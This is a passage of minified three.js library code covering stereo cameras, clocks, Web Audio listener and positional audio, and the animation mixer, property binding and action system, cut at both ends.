lr.prototype.toJSON.call(this,t)}}),Or.prototype=Object.assign(Object.create(Rr.prototype),{constructor:Or,isHemisphereLightProbe:!0,copy:function(t){return Rr.prototype.copy.call(this,t),this},toJSON:function(t){return Rr.prototype.toJSON.call(this,t)}}),Ir.prototype=Object.assign(Object.create(Rr.prototype),{constructor:Ir,isAmbientLightProbe:!0,copy:function(t){return Rr.prototype.copy.call(this,t),this},toJSON:function(t){return Rr.prototype.toJSON.call(this,t)}});var Ll=new h,Pl=new h;Object.assign(zr.prototype,{update:function(t){var e=this._cache;if(e.focus!==t.focus||e.fov!==t.fov||e.aspect!==t.aspect*this.aspect||e.near!==t.near||e.far!==t.far||e.zoom!==t.zoom||e.eyeSep!==this.eyeSep){e.focus=t.focus,e.fov=t.fov,e.aspect=t.aspect*this.aspect,e.near=t.near,e.far=t.far,e.zoom=t.zoom,e.eyeSep=this.eyeSep;var i=t.projectionMatrix.clone(),n=e.eyeSep/2,r=n*e.near/e.focus,a=e.near*Math.tan(Ca.DEG2RAD*e.fov*.5)/e.zoom;Pl.elements[12]=-n,Ll.elements[12]=n,n=-a*e.aspect+r;var o=a*e.aspect+r;i.elements[0]=2*e.near/(o-n),i.elements[8]=(o+n)/(o-n),this.cameraL.projectionMatrix.copy(i),n=-a*e.aspect-r,o=a*e.aspect-r,i.elements[0]=2*e.near/(o-n),i.elements[8]=(o+n)/(o-n),this.cameraR.projectionMatrix.copy(i)}this.cameraL.matrixWorld.copy(t.matrixWorld).multiply(Pl),this.cameraR.matrixWorld.copy(t.matrixWorld).multiply(Ll)}}),Object.assign(Dr.prototype,{start:function(){this.oldTime=this.startTime=("undefined"==typeof performance?Date:performance).now(),this.elapsedTime=0,this.running=!0},stop:function(){this.getElapsedTime(),this.autoStart=this.running=!1},getElapsedTime:function(){return this.getDelta(),this.elapsedTime},getDelta:function(){var t=0;if(this.autoStart&&!this.running)return this.start(),0;if(this.running){var e=("undefined"==typeof performance?Date:performance).now();t=(e-this.oldTime)/1e3,this.oldTime=e,this.elapsedTime+=t}return t}});var Rl=new r,Ol=new n,Il=new r,zl=new r;Nr.prototype=Object.assign(Object.create(p.prototype),{constructor:Nr,getInput:function(){return this.gain},removeFilter:function(){return null!==this.filter&&(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination),this.gain.connect(this.context.destination),this.filter=null),this},getFilter:function(){return this.filter},setFilter:function(t){return null!==this.filter?(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination)):this.gain.disconnect(this.context.destination),this.filter=t,this.gain.connect(this.filter),this.filter.connect(this.context.destination),this},getMasterVolume:function(){return this.gain.gain.value},setMasterVolume:function(t){return this.gain.gain.setTargetAtTime(t,this.context.currentTime,.01),this},updateMatrixWorld:function(t){p.prototype.updateMatrixWorld.call(this,t),t=this.context.listener;var e=this.up;if(this.timeDelta=this._clock.getDelta(),this.matrixWorld.decompose(Rl,Ol,Il),zl.set(0,0,-1).applyQuaternion(Ol),t.positionX){var i=this.context.currentTime+this.timeDelta;t.positionX.linearRampToValueAtTime(Rl.x,i),t.positionY.linearRampToValueAtTime(Rl.y,i),t.positionZ.linearRampToValueAtTime(Rl.z,i),t.forwardX.linearRampToValueAtTime(zl.x,i),t.forwardY.linearRampToValueAtTime(zl.y,i),t.forwardZ.linearRampToValueAtTime(zl.z,i),t.upX.linearRampToValueAtTime(e.x,i),t.upY.linearRampToValueAtTime(e.y,i),t.upZ.linearRampToValueAtTime(e.z,i)}else t.setPosition(Rl.x,Rl.y,Rl.z),t.setOrientation(zl.x,zl.y,zl.z,e.x,e.y,e.z)}}),kr.prototype=Object.assign(Object.create(p.prototype),{constructor:kr,getOutput:function(){return this.gain},setNodeSource:function(t){return this.hasPlaybackControl=!1,this.sourceType="audioNode",this.source=t,this.connect(),this},setMediaElementSource:function(t){return this.hasPlaybackControl=!1,this.sourceType="mediaNode",this.source=this.context.createMediaElementSource(t),this.connect(),this},setBuffer:function(t){return this.buffer=t,this.sourceType="buffer",this.autoplay&&this.play(),this},play:function(){if(!0===this.isPlaying)console.warn("THREE.Audio: Audio is already playing.");else{if(!1!==this.hasPlaybackControl){var t=this.context.createBufferSource();return t.buffer=this.buffer,t.loop=this.loop,t.onended=this.onEnded.bind(this),this.startTime=this.context.currentTime,t.start(this.startTime,this.offset,this.duration),this.isPlaying=!0,this.source=t,this.setDetune(this.detune),this.setPlaybackRate(this.playbackRate),this.connect()}console.warn("THREE.Audio: this Audio has no playback control.")}},pause:function(){if(!1!==this.hasPlaybackControl)return!0===this.isPlaying&&(this.source.stop(),this.source.onended=null,this.offset+=(this.context.currentTime-this.startTime)*this.playbackRate,this.isPlaying=!1),this;console.warn("THREE.Audio: this Audio has no playback control.")},stop:function(){if(!1!==this.hasPlaybackControl)return this.source.stop(),this.source.onended=null,this.offset=0,this.isPlaying=!1,this;console.warn("THREE.Audio: this Audio has no playback control.")},connect:function(){if(0<this.filters.length){this.source.connect(this.filters[0]);for(var t=1,e=this.filters.length;t<e;t++)this.filters[t-1].connect(this.filters[t]);this.filters[this.filters.length-1].connect(this.getOutput())}else this.source.connect(this.getOutput());return this},disconnect:function(){if(0<this.filters.length){this.source.disconnect(this.filters[0]);for(var t=1,e=this.filters.length;t<e;t++)this.filters[t-1].disconnect(this.filters[t]);this.filters[this.filters.length-1].disconnect(this.getOutput())}else this.source.disconnect(this.getOutput());return this},getFilters:function(){return this.filters},setFilters:function(t){return t||(t=[]),!0===this.isPlaying?(this.disconnect(),this.filters=t,this.connect()):this.filters=t,this},setDetune:function(t){if(this.detune=t,void 0!==this.source.detune)return!0===this.isPlaying&&this.source.detune.setTargetAtTime(this.detune,this.context.currentTime,.01),this},getDetune:function(){return this.detune},getFilter:function(){return this.getFilters()[0]},setFilter:function(t){return this.setFilters(t?[t]:[])},setPlaybackRate:function(t){if(!1!==this.hasPlaybackControl)return this.playbackRate=t,!0===this.isPlaying&&this.source.playbackRate.setTargetAtTime(this.playbackRate,this.context.currentTime,.01),this;console.warn("THREE.Audio: this Audio has no playback control.")},getPlaybackRate:function(){return this.playbackRate},onEnded:function(){this.isPlaying=!1},getLoop:function(){return!1===this.hasPlaybackControl?(console.warn("THREE.Audio: this Audio has no playback control."),!1):this.loop},setLoop:function(t){if(!1!==this.hasPlaybackControl)return this.loop=t,!0===this.isPlaying&&(this.source.loop=this.loop),this;console.warn("THREE.Audio: this Audio has no playback control.")},getVolume:function(){return this.gain.gain.value},setVolume:function(t){return this.gain.gain.setTargetAtTime(t,this.context.currentTime,.01),this}});var Dl=new r,Nl=new n,kl=new r,Bl=new r;Br.prototype=Object.assign(Object.create(kr.prototype),{constructor:Br,getOutput:function(){return this.panner},getRefDistance:function(){return this.panner.refDistance},setRefDistance:function(t){return this.panner.refDistance=t,this},getRolloffFactor:function(){return this.panner.rolloffFactor},setRolloffFactor:function(t){return this.panner.rolloffFactor=t,this},getDistanceModel:function(){return this.panner.distanceModel},setDistanceModel:function(t){return this.panner.distanceModel=t,this},getMaxDistance:function(){return this.panner.maxDistance},setMaxDistance:function(t){return this.panner.maxDistance=t,this},setDirectionalCone:function(t,e,i){return this.panner.coneInnerAngle=t,this.panner.coneOuterAngle=e,this.panner.coneOuterGain=i,this},updateMatrixWorld:function(t){if(p.prototype.updateMatrixWorld.call(this,t),!0!==this.hasPlaybackControl||!1!==this.isPlaying)if(this.matrixWorld.decompose(Dl,Nl,kl),Bl.set(0,0,1).applyQuaternion(Nl),(t=this.panner).positionX){var e=this.context.currentTime+this.listener.timeDelta;t.positionX.linearRampToValueAtTime(Dl.x,e),t.positionY.linearRampToValueAtTime(Dl.y,e),t.positionZ.linearRampToValueAtTime(Dl.z,e),t.orientationX.linearRampToValueAtTime(Bl.x,e),t.orientationY.linearRampToValueAtTime(Bl.y,e),t.orientationZ.linearRampToValueAtTime(Bl.z,e)}else t.setPosition(Dl.x,Dl.y,Dl.z),t.setOrientation(Bl.x,Bl.y,Bl.z)}}),Object.assign(Fr.prototype,{getFrequencyData:function(){return this.analyser.getByteFrequencyData(this.data),this.data},getAverageFrequency:function(){for(var t=0,e=this.getFrequencyData(),i=0;i<e.length;i++)t+=e[i];return t/e.length}}),Object.assign(Hr.prototype,{accumulate:function(t,e){var i=this.buffer,n=this.valueSize;t=t*n+n;var r=this.cumulativeWeight;if(0===r){for(r=0;r!==n;++r)i[t+r]=i[r];r=e}else r+=e,this._mixBufferRegion(i,t,0,e/r,n);this.cumulativeWeight=r},apply:function(t){var e=this.valueSize,i=this.buffer;t=t*e+e;var n=this.cumulativeWeight,r=this.binding;this.cumulativeWeight=0,1>n&&this._mixBufferRegion(i,t,3*e,1-n,e),n=e;for(var a=e+e;n!==a;++n)if(i[n]!==i[n+e]){r.setValue(i,t);break}},saveOriginalState:function(){var t=this.buffer,e=this.valueSize,i=3*e;this.binding.getValue(t,i);for(var n=e;n!==i;++n)t[n]=t[i+n%e];this.cumulativeWeight=0},restoreOriginalState:function(){this.binding.setValue(this.buffer,3*this.valueSize)},_select:function(t,e,i,n,r){if(.5<=n)for(n=0;n!==r;++n)t[e+n]=t[i+n]},_slerp:function(t,e,i,r){n.slerpFlat(t,e,t,e,t,i,r)},_lerp:function(t,e,i,n,r){for(var a=1-n,o=0;o!==r;++o){var s=e+o;t[s]=t[s]*a+t[i+o]*n}}});var Fl=/[\[\]\.:\/]/g,Hl="[^"+"\\[\\]\\.:\\/".replace("\\.","")+"]",Gl=/((?:WC+[\/:])*)/.source.replace("WC","[^\\[\\]\\.:\\/]"),jl=/(WCOD+)?/.source.replace("WCOD",Hl),Ul=/(?:\.(WC+)(?:\[(.+)\])?)?/.source.replace("WC","[^\\[\\]\\.:\\/]"),Vl=/\.(WC+)(?:\[(.+)\])?/.source.replace("WC","[^\\[\\]\\.:\\/]"),Wl=new RegExp("^"+Gl+jl+Ul+Vl+"$"),ql=["material","materials","bones"];Object.assign(Gr.prototype,{getValue:function(t,e){this.bind();var i=this._bindings[this._targetGroup.nCachedObjects_];void 0!==i&&i.getValue(t,e)},setValue:function(t,e){for(var i=this._bindings,n=this._targetGroup.nCachedObjects_,r=i.length;n!==r;++n)i[n].setValue(t,e)},bind:function(){for(var t=this._bindings,e=this._targetGroup.nCachedObjects_,i=t.length;e!==i;++e)t[e].bind()},unbind:function(){for(var t=this._bindings,e=this._targetGroup.nCachedObjects_,i=t.length;e!==i;++e)t[e].unbind()}}),Object.assign(jr,{Composite:Gr,create:function(t,e,i){return t&&t.isAnimationObjectGroup?new jr.Composite(t,e,i):new jr(t,e,i)},sanitizeNodeName:function(t){return t.replace(/\s/g,"_").replace(Fl,"")},parseTrackName:function(t){var e=Wl.exec(t);if(!e)throw Error("PropertyBinding: Cannot parse trackName: "+t);var i=(e={nodeName:e[2],objectName:e[3],objectIndex:e[4],propertyName:e[5],propertyIndex:e[6]}).nodeName&&e.nodeName.lastIndexOf(".");if(void 0!==i&&-1!==i){var n=e.nodeName.substring(i+1);-1!==ql.indexOf(n)&&(e.nodeName=e.nodeName.substring(0,i),e.objectName=n)}if(null===e.propertyName||0===e.propertyName.length)throw Error("PropertyBinding: can not parse propertyName from trackName: "+t);return e},findNode:function(t,e){if(!e||""===e||"root"===e||"."===e||-1===e||e===t.name||e===t.uuid)return t;if(t.skeleton){var i=t.skeleton.getBoneByName(e);if(void 0!==i)return i}if(t.children){var n=function(t){for(var i=0;i<t.length;i++){var r=t[i];if(r.name===e||r.uuid===e||(r=n(r.children)))return r}return null};if(t=n(t.children))return t}return null}}),Object.assign(jr.prototype,{_getValue_unavailable:function(){},_setValue_unavailable:function(){},BindingType:{Direct:0,EntireArray:1,ArrayElement:2,HasFromToArray:3},Versioning:{None:0,NeedsUpdate:1,MatrixWorldNeedsUpdate:2},GetterByBindingType:[function(t,e){t[e]=this.node[this.propertyName]},function(t,e){for(var i=this.resolvedProperty,n=0,r=i.length;n!==r;++n)t[e++]=i[n]},function(t,e){t[e]=this.resolvedProperty[this.propertyIndex]},function(t,e){this.resolvedProperty.toArray(t,e)}],SetterByBindingTypeAndVersioning:[[function(t,e){this.targetObject[this.propertyName]=t[e]},function(t,e){this.targetObject[this.propertyName]=t[e],this.targetObject.needsUpdate=!0},function(t,e){this.targetObject[this.propertyName]=t[e],this.targetObject.matrixWorldNeedsUpdate=!0}],[function(t,e){for(var i=this.resolvedProperty,n=0,r=i.length;n!==r;++n)i[n]=t[e++]},function(t,e){for(var i=this.resolvedProperty,n=0,r=i.length;n!==r;++n)i[n]=t[e++];this.targetObject.needsUpdate=!0},function(t,e){for(var i=this.resolvedProperty,n=0,r=i.length;n!==r;++n)i[n]=t[e++];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(t,e){this.resolvedProperty[this.propertyIndex]=t[e]},function(t,e){this.resolvedProperty[this.propertyIndex]=t[e],this.targetObject.needsUpdate=!0},function(t,e){this.resolvedProperty[this.propertyIndex]=t[e],this.targetObject.matrixWorldNeedsUpdate=!0}],[function(t,e){this.resolvedProperty.fromArray(t,e)},function(t,e){this.resolvedProperty.fromArray(t,e),this.targetObject.needsUpdate=!0},function(t,e){this.resolvedProperty.fromArray(t,e),this.targetObject.matrixWorldNeedsUpdate=!0}]],getValue:function(t,e){this.bind(),this.getValue(t,e)},setValue:function(t,e){this.bind(),this.setValue(t,e)},bind:function(){var t=this.node,e=this.parsedPath,i=e.objectName,n=e.propertyName,r=e.propertyIndex;if(t||(this.node=t=jr.findNode(this.rootNode,e.nodeName)||this.rootNode),this.getValue=this._getValue_unavailable,this.setValue=this._setValue_unavailable,t){if(i){var a=e.objectIndex;switch(i){case"materials":if(!t.material)return void console.error("THREE.PropertyBinding: Can not bind to material as node does not have a material.",this);if(!t.material.materials)return void console.error("THREE.PropertyBinding: Can not bind to material.materials as node.material does not have a materials array.",this);t=t.material.materials;break;case"bones":if(!t.skeleton)return void console.error("THREE.PropertyBinding: Can not bind to bones as node does not have a skeleton.",this);for(t=t.skeleton.bones,i=0;i<t.length;i++)if(t[i].name===a){a=i;break}break;default:if(void 0===t[i])return void console.error("THREE.PropertyBinding: Can not bind to objectName of node undefined.",this);t=t[i]}if(void 0!==a){if(void 0===t[a])return void console.error("THREE.PropertyBinding: Trying to bind to objectIndex of objectName, but is undefined.",this,t);t=t[a]}}if(void 0===(a=t[n]))console.error("THREE.PropertyBinding: Trying to update property for track: "+e.nodeName+"."+n+" but it wasn't found.",t);else{if(e=this.Versioning.None,this.targetObject=t,void 0!==t.needsUpdate?e=this.Versioning.NeedsUpdate:void 0!==t.matrixWorldNeedsUpdate&&(e=this.Versioning.MatrixWorldNeedsUpdate),i=this.BindingType.Direct,void 0!==r){if("morphTargetInfluences"===n){if(!t.geometry)return void console.error("THREE.PropertyBinding: Can not bind to morphTargetInfluences because node does not have a geometry.",this);if(t.geometry.isBufferGeometry){if(!t.geometry.morphAttributes)return void console.error("THREE.PropertyBinding: Can not bind to morphTargetInfluences because node does not have a geometry.morphAttributes.",this);for(i=0;i<this.node.geometry.morphAttributes.position.length;i++)if(t.geometry.morphAttributes.position[i].name===r){r=i;break}}else{if(!t.geometry.morphTargets)return void console.error("THREE.PropertyBinding: Can not bind to morphTargetInfluences because node does not have a geometry.morphTargets.",this);for(i=0;i<this.node.geometry.morphTargets.length;i++)if(t.geometry.morphTargets[i].name===r){r=i;break}}}i=this.BindingType.ArrayElement,this.resolvedProperty=a,this.propertyIndex=r}else void 0!==a.fromArray&&void 0!==a.toArray?(i=this.BindingType.HasFromToArray,this.resolvedProperty=a):Array.isArray(a)?(i=this.BindingType.EntireArray,this.resolvedProperty=a):this.propertyName=n;this.getValue=this.GetterByBindingType[i],this.setValue=this.SetterByBindingTypeAndVersioning[i][e]}}else console.error("THREE.PropertyBinding: Trying to update node for track: "+this.path+" but it wasn't found.")},unbind:function(){this.node=null,this.getValue=this._getValue_unbound,this.setValue=this._setValue_unbound}}),Object.assign(jr.prototype,{_getValue_unbound:jr.prototype.getValue,_setValue_unbound:jr.prototype.setValue}),Object.assign(Ur.prototype,{isAnimationObjectGroup:!0,add:function(){for(var t=this._objects,e=t.length,i=this.nCachedObjects_,n=this._indicesByUUID,r=this._paths,a=this._parsedPaths,o=this._bindings,s=o.length,l=void 0,c=0,h=arguments.length;c!==h;++c){var u=arguments[c],d=u.uuid,p=n[d];if(void 0===p){p=e++,n[d]=p,t.push(u),d=0;for(var f=s;d!==f;++d)o[d].push(new jr(u,r[d],a[d]))}else if(p<i){l=t[p];var m=--i;for(n[(f=t[m]).uuid]=p,t[p]=f,n[d]=m,t[m]=u,d=0,f=s;d!==f;++d){var g=o[d],v=g[p];g[p]=g[m],void 0===v&&(v=new jr(u,r[d],a[d])),g[m]=v}}else t[p]!==l&&console.error("THREE.AnimationObjectGroup: Different objects with the same UUID detected. Clean the caches or recreate your infrastructure when reloading scenes.")}this.nCachedObjects_=i},remove:function(){for(var t=this._objects,e=this.nCachedObjects_,i=this._indicesByUUID,n=this._bindings,r=n.length,a=0,o=arguments.length;a!==o;++a){var s=arguments[a],l=s.uuid,c=i[l];if(void 0!==c&&c>=e){var h=e++,u=t[h];for(i[u.uuid]=c,t[c]=u,i[l]=h,t[h]=s,s=0,l=r;s!==l;++s){var d=(u=n[s])[c];u[c]=u[h],u[h]=d}}}this.nCachedObjects_=e},uncache:function(){for(var t=this._objects,e=t.length,i=this.nCachedObjects_,n=this._indicesByUUID,r=this._bindings,a=r.length,o=0,s=arguments.length;o!==s;++o){var l=arguments[o].uuid,c=n[l];if(void 0!==c)if(delete n[l],c<i){var h=t[l=--i],u=--e,d=t[u];for(n[h.uuid]=c,t[c]=h,n[d.uuid]=l,t[l]=d,t.pop(),h=0,d=a;h!==d;++h){var p=r[h],f=p[u];p[c]=p[l],p[l]=f,p.pop()}}else for(n[(d=t[u=--e]).uuid]=c,t[c]=d,t.pop(),h=0,d=a;h!==d;++h)(p=r[h])[c]=p[u],p.pop()}this.nCachedObjects_=i},subscribe_:function(t,e){var i=this._bindingsIndicesByPath,n=i[t],r=this._bindings;if(void 0!==n)return r[n];var a=this._paths,o=this._parsedPaths,s=this._objects,l=this.nCachedObjects_,c=Array(s.length);for(n=r.length,i[t]=n,a.push(t),o.push(e),r.push(c),i=l,n=s.length;i!==n;++i)c[i]=new jr(s[i],t,e);return c},unsubscribe_:function(t){var e=this._bindingsIndicesByPath,i=e[t];if(void 0!==i){var n=this._paths,r=this._parsedPaths,a=this._bindings,o=a.length-1,s=a[o];e[t[o]]=i,a[i]=s,a.pop(),r[i]=r[o],r.pop(),n[i]=n[o],n.pop()}}}),Object.assign(Vr.prototype,{play:function(){return this._mixer._activateAction(this),this},stop:function(){return this._mixer._deactivateAction(this),this.reset()},reset:function(){return this.paused=!1,this.enabled=!0,this.time=0,this._loopCount=-1,this._startTime=null,this.stopFading().stopWarping()},isRunning:function(){return this.enabled&&!this.paused&&0!==this.timeScale&&null===this._startTime&&this._mixer._isActiveAction(this)},isScheduled:function(){return this._mixer._isActiveAction(this)},startAt:function(t){return this._startTime=t,this},setLoop:function(t,e){return this.loop=t,this.repetitions=e,this},setEffectiveWeight:function(t){return this.weight=t,this._effectiveWeight=this.enabled?t:0,this.stopFading()},getEffectiveWeight:function(){return this._effectiveWeight},fadeIn:function(t){return this._scheduleFading(t,0,1)},fadeOut:function(t){return this._scheduleFading(t,1,0)},crossFadeFrom:function(t,e,i){if(t.fadeOut(e),this.fadeIn(e),i){i=this._clip.duration;var n=t._clip.duration,r=i/n;t.warp(1,n/i,e),this.warp(r,1,e)}return this},crossFadeTo:function(t,e,i){return t.crossFadeFrom(this,e,i)},stopFading:function(){var t=this._weightInterpolant;return null!==t&&(this._weightInterpolant=null,this._mixer._takeBackControlInterpolant(t)),this},setEffectiveTimeScale:function(t){return this.timeScale=t,this._effectiveTimeScale=this.paused?0:t,this.stopWarping()},getEffectiveTimeScale:function(){return this._effectiveTimeScale},setDuration:function(t){return this.timeScale=this._clip.duration/t,this.stopWarping()},syncWith:function(t){return this.time=t.time,this.timeScale=t.timeScale,this.stopWarping()},halt:function(t){return this.warp(this._effectiveTimeScale,0,t)},warp:function(t,e,i){var n=this._mixer,r=n.time,a=this._timeScaleInterpolant,o=this.timeScale;return null===a&&(this._timeScaleInterpolant=a=n._lendControlInterpolant()),n=a.parameterPositions,a=a.sampleValues,n[0]=r,n[1]=r+i,a[0]=t/o,a[1]=e/o,this},stopWarping:function(){var t=this._timeScaleInterpolant;return null!==t&&(this._timeScaleInterpolant=null,this._mixer._takeBackControlInterpolant(t)),this},getMixer:function(){return this._mixer},getClip:function(){return this._clip},getRoot:function(){return this._localRoot||this._mixer._root},_update:function(t,e,i,n){if(this.enabled){var r=this._startTime;if(null!==r){if(0>(e=(t-r)*i)||0===i)return;this._startTime=null,e*=i}if(e*=this._updateTimeScale(t),i=this._updateTime(e),0<(t=this._updateWeight(t))){e=this._interpolants,r=this._propertyBindings;for(var a=0,o=e.length;a!==o;++a)e[a].evaluate(i),r[a].accumulate(n,t)}}else this._updateWeight(t)},_updateWeight:function(t){var e=0;if(this.enabled){e=this.weight;var i=this._weightInterpolant;if(null!==i){var n=i.evaluate(t)[0];e*=n,t>i.parameterPositions[1]&&(this.stopFading(),0===n&&(this.enabled=!1))}}return this._effectiveWeight=e},_updateTimeScale:function(t){var e=0;if(!this.paused){e=this.timeScale;var i=this._timeScaleInterpolant;if(null!==i)e*=i.evaluate(t)[0],t>i.parameterPositions[1]&&(this.stopWarping(),0===e?this.paused=!0:this.timeScale=e)}return this._effectiveTimeScale=e},_updateTime:function(t){var e=this.time+t,i=this._clip.duration,n=this.loop,r=this._loopCount,a=2202===n;if(0===t)return-1===r?e:a&&1==(1&r)?i-e:e;if(2200===n)t:{if(-1===r&&(this._loopCount=0,this._setEndings(!0,!0,!1)),e>=i)e=i;else{if(!(0>e)){this.time=e;break t}e=0}this.clampWhenFinished?this.paused=!0:this.enabled=!1,this.time=e,this._mixer.dispatchEvent({type:"finished",action:this,direction:0>t?-1:1})}else{if(-1===r&&(0<=t?(r=0,this._setEndings(!0,0===this.repetitions,a)):this._setEndings(0===this.repetitions,!0,a)),e>=i||0>e){e-=i*(n=Math.floor(e/i)),r+=Math.abs(n);var o=this.repetitions-r;0>=o?(this.clampWhenFinished?this.paused=!0:this.enabled=!1,this.time=e=0<t?i:0,this._mixer.dispatchEvent({type:"finished",action:this,direction:0<t?1:-1})):(1===o?(t=0>t,this._setEndings(t,!t,a)):this._setEndings(!1,!1,a),this._loopCount=r,this.time=e,this._mixer.dispatchEvent({type:"loop",action:this,loopDelta:n}))}else this.time=e;if(a&&1==(1&r))return i-e}return e},_setEndings:function(t,e,i){var n=this._interpolantSettings;i?(n.endingStart=2401,n.endingEnd=2401):(n.endingStart=t?this.zeroSlopeAtStart?2401:2400:2402,n.endingEnd=e?this.zeroSlopeAtEnd?2401:2400:2402)},_scheduleFading:function(t,e,i){var n=this._mixer,r=n.time,a=this._weightInterpolant;return null===a&&(this._weightInterpolant=a=n._lendControlInterpolant()),n=a.parameterPositions,a=a.sampleValues,n[0]=r,a[0]=e,n[1]=r+t,a[1]=i,this}}),Wr.prototype=Object.assign(Object.create(e.prototype),{constructor:Wr,_bindAction:function(t,e){var i=t._localRoot||this._root,n=t._clip.tracks,r=n.length,a=t._propertyBindings;t=t._interpolants;var o=i.uuid,s=this._bindingsByRootAndName,l=s[o];for(void 0===l&&(l={},s[o]=l),s=0;s!==r;++s){var c=n[s],h=c.name,u=l[h];if(void 0===u){if(void 0!==(u=a[s])){null===u._cacheIndex&&(++u.referenceCount,this._addInactiveBinding(u,o,h));continue}++(u=new Hr(jr.create(i,h,e&&e._propertyBindings[s].binding.parsedPath),c.ValueTypeName,c.getValueSize())).referenceCount,this._addInactiveBinding(u,o,h)}a[s]=u,t[s].resultBuffer=u.buffer}},_activateAction:function(t){if(!this._isActiveAction(t)){if(null===t._cacheIndex){var e=(t._localRoot||this._root).uuid,i=t._clip.uuid,n=this._actionsByClip[i];this._bindAction(t,n&&n.knownActions[0]),this._addInactiveAction(t,i,e)}for(i=0,n=(e=t._propertyBindings).length;i!==n;++i){var r=e[i];0==r.useCount++&&(this._lendBinding(r),r.saveOriginalState())}this._lendAction(t)}},_deactivateAction:function(t){if(this._isActiveAction(t)){for(var e=t._propertyBindings,i=0,n=e.length;i!==n;++i){var r=e[i];0==--r.useCount&&(r.restoreOriginalState(),this._takeBackBinding(r))}this._takeBackAction(t)}},_initMemoryManager:function(){this._actions=[],this._nActiveActions=0,this._actionsByClip={},this._bindings=[],this._nActiveBindings=0,this._bindingsByRootAndName={},this._controlInterpolants=[],this._nActiveControlInterpolants=0;var t=this;this.stats={actions:{get total(){return t._actions.length},get inUse(){return t._nActiveActions}},bindings:{get total(){return t._bindings.length},get inUse(){return t._nActiveBindings}},controlInterpolants:{get total(){return t._controlInterpolants.length},get inUse(){return t._nActiveControlInterpolants}}}},_isActiveAction:function(t){return null!==(t=t._cacheIndex)&&t<this._nActiveActions},_addInactiveAction:function(t,e,i){var n=this._actions,r=this._actionsByClip,a=r[e];void 0===a?(a={knownActions:[t],actionByRoot:{}},t._byClipCacheIndex=0,r[e]=a):(e=a.knownActions,t._byClipCacheIndex=e.length,e.push(t)),t._cacheIndex=n.length,n.push(t),a.actionByRoot[i]=t},_removeInactiveAction:function(t){var e=this._actions,i=e[e.length-1],n=t._cacheIndex;i._cacheIndex=n,e[n]=i,e.pop(),t._cacheIndex=null,e=t._clip.uuid;var r=(n=(i=this._actionsByClip)[e]).knownActions,a=r[r.length-1],o=t._byClipCacheIndex;a._byClipCacheIndex=o,r[o]=a,r.pop(),t._byClipCacheIndex=null,delete n.actionByRoot[(t._localRoot||this._root).uuid],0===r.length&&delete i[e],this._removeInactiveBindingsForAction(t)},_removeInactiveBindingsForAction:function(t){for(var e=0,i=(t=t._propertyBindings).length;e!==i;++e){var n=t[e];0==--n.referenceCount&&this._removeInactiveBinding(n)}},_lendAction:function(t){var e=this._actions,i=t._cacheIndex,n=this._nActiveActions++,r=e[n];t._cacheIndex=n,e[n]=t,r._cacheIndex=i,e[i]=r},_takeBackAction:function(t){var e=this._actions,i=t._cacheIndex,n=--this._nActiveActions,r=e[n];t._cacheIndex=n,e[n]=t,r._cacheIndex=i,e[i]=r},_addInactiveBinding:function(t,e,i){var n=this._bindingsByRootAndName,r=n[e],a=this._bindings;void 0===r&&(r={},n[e]=r),r[i]=t,t._cacheIndex=a.length,a.push(t)},_removeInactiveBinding:function(t){var e=this._bindings,i=t.binding,n=i.rootNode.uuid;i=i.path;var r=this._bindingsByRootAndName,a=r[n],o=e[e.length-1];t=t._cacheIndex,o._cacheIndex=t,e[t]=o,e.pop(),delete a[i],0===Object.keys(a).length&&delete r[n]},_lendBinding:function(t){var e=this._bindings,i=t._cacheIndex,n=this._nActiveBindings++,r=e[n];t._cacheIndex=n,e[n]=t,r._cacheIndex=i,e[i]=r},_takeBackBinding:function(t){var e=this._bindings,i=t._cacheIndex,n=--this._nActiveBindings,r=e[n];t._cacheIndex=n,e[n]=t,r._cacheIndex=i,e[i]=r},_lendControlInterpolant:function(){var t=this._controlInterpolants,e=this._nActiveControlInterpolants++,i=t[e];return void 0===i&&((i=new Mn(new Float32Array(2),new Float32Array(2),1,this._controlInterpolantsResultBuffer)).__cacheIndex=e,t[e]=i),i},_takeBackControlInterpolant:function(t){var e=this._controlInterpolants,i=t.__cacheIndex,n=--this._nActiveControlInterpolants,r=e[n];t.__cacheIndex=n,e[n]=t,r.__cacheIndex=i,e[i]=r},_controlInterpolantsResultBuffer:new Float32Array(1),clipAction:function(t,e){var i=e||this._root,n=i.uuid;t=null!==(i="string"==typeof t?In.findByName(i,t):t)?i.uuid:t;var r=this._actionsByClip[t],a=null;if(void 0!==r){if(void 0!==(a=r.actionByRoot[n]))return a;a=r.knownActions[0],null===i&&(i=a._clip)}return null===i?null:(e=new Vr(this,i,e),this._bindAction(e,a),this._addInactiveAction(e,t,n),e)},existingAction:function(t,e){var i=e||this._root;return e=i.uuid,i="string"==typeof t?In.findByName(i,t):t,void 0!==(t=this._actionsByClip[i?i.uuid:t])&&t.actionByRoot[e]||null},stopAllAction:function(){for(var t=this._actions,e=this._nActiveActions,i=this._bindings,n=this._nActiveBindings,r=this._nActiveBindings=this._nActiveActions=0;r!==e;++r)t[r].reset();for(r=0;r!==n;++r)i[r].useCount=0;return this},update:function(t){t*=this.timeScale;for(var e=this._actions,i=this._nActiveActions,n=this.time+=t,r=Math.sign(t),a=this._accuIndex^=1,o=0;o!==i;++o)e[o]._update(n,t,r,a);for(t=this._bindings,e=this._nActiveBindings,o=0;o!==e;++o)t[o].apply(a);return this},getRoot:function(){return this._root},uncacheClip:function(t){var e=this._actions;t=t.uuid;var i=this._actionsByClip,n=i[t];if(void 0!==n){for(var r=0,a=(n=n.knownActions).length;r!==a;++r){var o=n[r];this._deactivateAction(o);var s=o._cacheIndex,l=e[e.length-1];o._cacheIndex=null,o._byClipCacheIndex=null,l._cacheIndex=s,e[s]=l,e.pop(),this._removeInactiveBindingsForAction(o)}delete i[t]}},uncacheRoot:function(t){t=t.uuid;var e=this._actionsByClip;for(n in e){var i=e[n].actionByRoot[t];void 0!==i&&(this._deactivateAction(i),this._removeInactiveAction(i))}var n=this._bindingsByRootAndName[t];if(void 0!==n)for(var r in n)(t=n[r]).restoreOriginalState(),this._removeInactiveBinding(t)},uncacheAction:function(t,e){null!==(t=this.existingAction(t,e))&&(this._deactivateAction(t),this._removeInactiveAction(t))}}),qr.prototype.clone=function(){return new qr(void 0===this.value.clone?this.value:this.value.clone())},Xr.prototype=Object.assign(Object.create(Fe.prototype),{constructor:Xr,isInstancedInterleavedBuffer:!0,copy:function(t){return 